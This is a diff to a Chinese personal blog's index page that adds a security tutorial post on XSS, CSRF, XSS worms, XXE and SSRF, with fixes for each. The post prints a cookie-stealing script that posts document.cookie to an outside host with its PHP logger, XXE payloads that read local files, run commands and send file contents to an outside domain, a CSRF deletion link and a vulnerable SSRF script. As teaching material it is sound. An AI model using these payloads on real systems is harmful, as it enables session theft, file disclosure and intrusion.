@@ -281,6 +281,265 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/30/XSS跨站脚本攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen DY">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen's Bolg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/30/XSS跨站脚本攻击/" itemprop="url">XSS跨站脚本攻击</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-30T15:06:34+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.6k字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  10分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="JS和AJAX的一些基础"><a href="#JS和AJAX的一些基础" class="headerlink" title="JS和AJAX的一些基础"></a>JS和AJAX的一些基础</h2><p>1.<code>window.onload()</code>指的是等网页的元素都加载完毕就会执行这段代码<br>如果存在两个onload，那么只会执行后一个</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span>&#123; alert(“text1”);&#125;; </span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span>&#123; alert(“text2”);&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>2.onreadystatechange 事件：当请求被发送到服务器时，我们需要执行一些基于响应的任务。每当 readyState 改变时，就会触发 onreadystatechange 事件。下面是一个实例：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>).innerHTML=xmlhttp.responseText;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ajax跨域"><a href="#Ajax跨域" class="headerlink" title="Ajax跨域"></a>Ajax跨域</h2><h3 id="正常的跨域实现方案"><a href="#正常的跨域实现方案" class="headerlink" title="正常的跨域实现方案"></a>正常的跨域实现方案</h3><p>1.允许单个域名访问<br>若需要指定某域名(<a href="http://client.runoob.com)跨域访问，只需要在(http://server.runoob.com/server.php)文件的头部添加如下代码：" target="_blank" rel="noopener">http://client.runoob.com)跨域访问，只需要在(http://server.runoob.com/server.php)文件的头部添加如下代码：</a><br><code>header(&#39;Access-Control-Allow-Origin:http://client.runoob.com&#39;);</code></p>
+<p>2.允许多个域名访问<br>在头部文件中添加如下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$origin = <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_ORIGIN'</span>])? $_SERVER[<span class="string">'HTTP_ORIGIN'</span>] : <span class="string">''</span>;  </span><br><span class="line">$allow_origin = <span class="keyword">array</span>(   <span class="string">'http://client1.runoob.com'</span>,  <span class="string">'http://client2.runoob.com'</span>  );  </span><br><span class="line"><span class="keyword">if</span>(in_array($origin, $allow_origin))&#123;  </span><br><span class="line">    header(<span class="string">'Access-Control-Allow-Origin:'</span>.$origin);       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>3.允许所有域名访问<br>在头部添加如下代码：<br><code>header(&#39;Access-Control-Allow-Origin:*&#39;);</code></p>
+<h3 id="利用其他方法实现跨域"><a href="#利用其他方法实现跨域" class="headerlink" title="利用其他方法实现跨域"></a>利用其他方法实现跨域</h3><p>1.在HTML中对跨域网站请求一些内容，例如图片，JS代码等信息，在请求网站后添加？以及需要传递的信息，从而实现信息的跨域传输。例如<br><code>&lt;img src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt;</code></p>
+<p><code>&lt;script src=&quot;http://rushrush.com/demo.php?c=xxx&quot;&gt;&lt;/script&gt;</code></p>
+<h2 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h2><p>存储XSS，会把攻击者的数据存储到服务器端，攻击行为将伴随着攻击数据一直存在。<br>一个存储xss攻击的例子，在内容行输入JS脚本，因为JS脚本一般比较长的原因，将src指向其他地方的一个JS文件</p>
+<img src="/2019/06/30/XSS跨站脚本攻击/1.png">
+
+<p>下面是该JS文件的源码，可以看到JS脚本通过获取当前网页的cookie并发送到其他服务器来实现窃取Cookie的操作：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xlx</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">window</span>.navigator.userAgent.indexOf(<span class="string">'MSIE'</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> xd = xlx();</span><br><span class="line"><span class="keyword">var</span> data = <span class="string">'c='</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">'http://rushrush.com/demo.php'</span>;</span><br><span class="line">xd.open(<span class="string">'post'</span>,url);</span><br><span class="line">xd.setRequestHeader(<span class="string">'content-type'</span>,<span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line"></span><br><span class="line">xd.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(xd.readyState == <span class="number">4</span> &amp;&amp; xd.status == <span class="number">200</span>)&#123;</span><br><span class="line">		<span class="comment">// document.write(xd.responseText);</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xd.send(data);</span><br></pre></td></tr></table></figure>
+
+<p>另外远端服务器的PHP代码作用是将传输过来的Cookie值存储到本地服务器，这样整个盗取的过程就完整了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Access-Control-Allow-Origin:*'</span>);</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">empty</span>($_REQUEST[<span class="string">'c'</span>])?<span class="string">""</span>:$_REQUEST[<span class="string">'c'</span>].<span class="string">"\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello '</span>.$c;</span><br><span class="line">$myfile = fopen(<span class="string">"d:/1.txt"</span>,<span class="string">"a+"</span>);</span><br><span class="line">fwrite($myfile,$c);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>和存储型CSS不同的是，非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。下面是一个攻击的例子：</p>
+<p>一下网页在用户键入一个用户名后，会反馈出Hello+用户名</p>
+<img src="/2019/06/30/XSS跨站脚本攻击/2.png">
+
+<p>如果在键入的用户名区域输入跨站脚本，则可以和上面的存储型XSS一样，获取到用户的Cookie信息，从而实现攻击，如下图的输入信息就能成功实现攻击</p>
+<img src="/2019/06/30/XSS跨站脚本攻击/3.png">
+
+<p>进行反射型XSS的时候，第三者通常会经注入了脚本信息的链接发给用户，用户通过打开该链接被获取Cookie，从而第三方利用获取的Cookie登陆。</p>
+<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>不经过后端,DOM—based XSS漏洞是基于文档对象模型Document Objeet Model,DOM)的一种漏洞,dom - xss是通过url传入参数去控制触发的。</p>
+<p>下面是一个利用DOM-XSS进行攻击的例子：<br><a href="https://www.jianshu.com/p/001daa7cf1f5" target="_blank" rel="noopener">DOM型XSS</a></p>
+<p>在浏览器执行DOM型XSS的时候，由于浏览器的X-XSS-Protection策略，会返回错误信息，并执行失败，如下图所示：</p>
+<img src="/2019/06/30/XSS跨站脚本攻击/4.png">
+
+<p>该策略可以通过CRLF绕过，利用的前提是我们能够控制一段参数，也就是POST或者GET的数据，而且这个数据会用在返回包的包头中。通过CRLF注入在返回包头中注入一个<code>X-XSS-Protection:0</code>从而使得浏览器关闭策略拦截，但是该漏洞现在已经很难利用了，因为最新版本的PHP不允许在HTTP表头内出现换行字符(要利用的话PHP版本必须低于5.1)…</p>
+<p>另外PHP中执行<code>header(&quot;Location: $a&quot;)</code>可在返回的包头中添加跳转的一行，想要增加其他的包头也同理。</p>
+<p><a href="https://blog.csdn.net/think_ycx/article/details/50267801" target="_blank" rel="noopener">CRLF注入</a></p>
+<h2 id="修补XSS漏洞"><a href="#修补XSS漏洞" class="headerlink" title="修补XSS漏洞"></a>修补XSS漏洞</h2><p>1.做处理（过滤）<br>可以通过将<code>&gt;</code>和<code>&lt;</code>删除，或者将这两种符号替换成去其他的符号代替</p>
+<p>2.转义<br>可以将JS语句转换成HTML实体，可以在PHP中使用htmlentities()语句</p>
+<h2 id="闭合XSS代码"><a href="#闭合XSS代码" class="headerlink" title="闭合XSS代码"></a>闭合XSS代码</h2><p>一般在PHP代码中会增加<code>&lt;textarea&gt;&lt;/textarea&gt;</code>区域，在该区域中用了JS代码会变成普通的文本而无法执行，因此在注入文本的时候会先增加<code>&lt;/textarea&gt;</code>把前面的区域给闭合掉，然后再添加JS脚本的代码</p>
+<h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>CSRF攻击和跨站脚本攻击有点类似，他可以通过给用户发送一个链接，然后在该链接中加入某个恶意的脚本，从而利用用户的登陆信息执行某些行为，比如说如下情况：</p>
+<p>如果存在一个链接<code>http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012</code><br>这个链接的作用是让博主删除编号为<code>126713012</code>的博客。</p>
+<p>攻击者首先在自己的域中构造一个页面：<br><code>http://www.a.com/csrf.html</code></p>
+<p>其内容为：<br><code>&lt;img src=&#39;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=126713012&#39; /&gt;</code><br>博客主通过点击进入攻击者构造的域，会看见一张失效的图片，回头却发现自己的博客被删除了。</p>
+<p>目前防御CSRF攻击主要有三种策略：验证HTTP Refer字段；在请求地址中添加token并验证；在HTTP头中自定义属性并验证</p>
+<h2 id="XSS蠕虫"><a href="#XSS蠕虫" class="headerlink" title="XSS蠕虫"></a>XSS蠕虫</h2><p>如果访问一个网站<code>http://www.a.com/1.js</code>会使得用户在某论坛发表一条评论，这条评论也就是<code>&lt;script src=http://www.a.com/1.js&gt;&lt;/script&gt;</code>。这样会使得这个评论迅速扩散开来，每一个看过这个网页的人都会传播这条评论。</p>
+<h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><p>XXE实际上就是XML的一个实体注入</p>
+<p>XML在外部实体的写法如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD 实例:</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">writer</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">copyright</span> <span class="attr">SYSTEM</span> "<span class="attr">http:</span>//<span class="attr">www.runoob.com</span>/<span class="attr">entities.dtd</span>"&gt;</span></span><br><span class="line"></span><br><span class="line">XML example:</span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span>&amp;writer;&amp;copyright;<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>XXE的危害有几种：可以ssrf，读文件和执行命令，扫描端口</p>
+<p>可用外部实体读文件，假若一个包的内容为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE bbb[</span></span><br><span class="line"><span class="meta">    &lt;?ENTITY xs SYSTEM "http://www.a.com/demo.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">&amp;xs;</span><br><span class="line"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">222</span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>该包的目的是通过外部访问<code>http://www.a.com/demo.php</code>这个网站，然后将访问返回的值赋给&amp;xs</p>
+<p>另外可以让服务器使用ftp协议取读取某个地址中的一个文件内容，如果要读取PHP文件，则需要使用PHP协议，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE bbb[</span></span><br><span class="line"><span class="meta">    &lt;?ENTITY xs SYSTEM "file:///D:/1.txt"&gt;</span></span><br><span class="line"><span class="meta">//    &lt;?ENTITY xs SYSTEM "php://filter/read=convert.base64-encode/resource=d:/1.php"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">&amp;xs;</span><br><span class="line"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">222</span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>还可以通过外部访问来扫描某IP的端口，如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE bbb[</span></span><br><span class="line"><span class="meta">    &lt;?ENTITY xs SYSTEM "127.0.0.1：1080"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">&amp;xs;</span><br><span class="line"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">222</span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过判断返回包的信息来判断该端口是否是开放的</p>
+<p>对于执行命令的用法，如下代码所示：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE bbb[</span></span><br><span class="line"><span class="meta">    &lt;?ENTITY xs SYSTEM "expect://id"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span></span><br><span class="line">&amp;xs;</span><br><span class="line"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span></span><br><span class="line">222</span><br><span class="line"><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用外部实体访问来进行攻击的案例如下：<br>首先攻击者发送一份包含xml实体内容的包给服务器，包的内容如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE bbb[</span></span><br><span class="line"><span class="meta">    &lt;?ENTITY %xs SYSTEM "www.a.com/a.dtd"&gt;</span></span><br><span class="line"><span class="meta">    %xs;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">&amp;xd2;</span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面是<code>a.dtd</code>的内容相当于读取服务器内的一个文件<code>1.txt</code>，并将其发送到了<code>www.a.com</code>域名中：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IENTITY</span> %<span class="attr">xd</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resource</span>=<span class="string">d:/1.txt</span>"&gt;</span></span><br><span class="line">&lt;IENTITY %demo "&lt;IENTITY xd2 SYSTEM "http://www.a.com/xs.php?i=%xd"&gt;"&gt;</span><br><span class="line">%demo;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE漏洞修补"><a href="#XXE漏洞修补" class="headerlink" title="XXE漏洞修补"></a>XXE漏洞修补</h2><p>1.使用开发语言提供的”禁用外部实体的方法“<br>PHP：<code>libxml_disable_entity_loader(true);</code><br>JAVA:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuliderFactory dbf = DocumentBuliderFactory.nerInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Python:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> extreexml</span><br><span class="line">Data = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure>
+
+<p>2.过滤用户提交的XML数据关键词：<code>&lt;!DOCTYPE</code>和<code>!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLUC</code></p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF是一种由攻击者构造形成的，由服务器端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（相当于服务器接受客户端所提供的URL，然后服务器代客户端去请求该URL，返回数据给客户端）</p>
+<p>用途：扫描端口，读取文件</p>
+<p>假如服务器端的PHP文件如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="keyword">empty</span>($_GET[<span class="string">'url'</span>])?<span class="string">""</span>:$_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>($url!=<span class="string">""</span>)&#123;</span><br><span class="line">    $html = file_get_contents($url,<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">echo</span> $html;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在请求网站过程中，发送一个网站地址，服务器就会带客户端返回该网站的内容，如果该网站是服务器的内部网站，那么该方式就成功获取了内部网站的内容。并且还能通过服务器扫描内部网下其他服务器的开放端口。</p>
+<p>为了避免SSRF攻击，转发的内容尽量在客户端执行，比如说从其他网站请求一张图片显示，服务器端应该返回代码<code>&lt;img src=www.xxx.com/ff.jpg /&gt;</code>，如果是服务器自己先获取到图片再进行转发，则很容易被利用。</p>
+<p>探测是否有SSRF漏洞的一种方法，在传入网址端传入<code>ip.cn</code>，若发现IP地址和本机不一样，则说明存在漏洞。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/27/SQL注入总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -538,7 +797,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -560,7 +819,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -611,7 +870,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">20.7k</span>
+    <span title="Site words total count">22.3k</span>
   
 </div>
 
